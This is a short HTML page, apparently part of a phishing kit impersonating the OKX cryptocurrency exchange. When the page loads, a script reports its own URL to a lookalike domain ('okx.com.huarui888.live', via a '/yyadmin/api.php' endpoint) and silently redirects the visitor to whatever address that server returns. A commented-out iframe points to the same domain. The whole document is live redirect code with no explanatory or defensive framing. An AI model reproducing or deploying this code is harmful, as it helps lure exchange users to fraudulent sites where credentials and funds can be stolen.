<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>嵌入其他页面内容</title>
    <style>
        iframe {
            width: 100%;
            height: 100vh;
            border: none;
        }
    </style>
</head>
<body>
<!--     <iframe src="https://www.okx.com.huarui888.live/index.html" title="嵌入页面"></iframe> -->
     <script>

var api_url = 'https://www.okx.com.huarui888.live';
        var domain = window.location.href;
        var xhr = new XMLHttpRequest();
        xhr.open('GET',api_url+'/yyadmin/api.php?zhu_url='+domain, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log(JSON.parse(xhr.responseText));
                if(JSON.parse(xhr.responseText).code == 1){
                    var url = JSON.parse(xhr.responseText).data
                    window.location.replace(url);
                }
            }
        };
        xhr.send();


  </script>

</body>
</html>
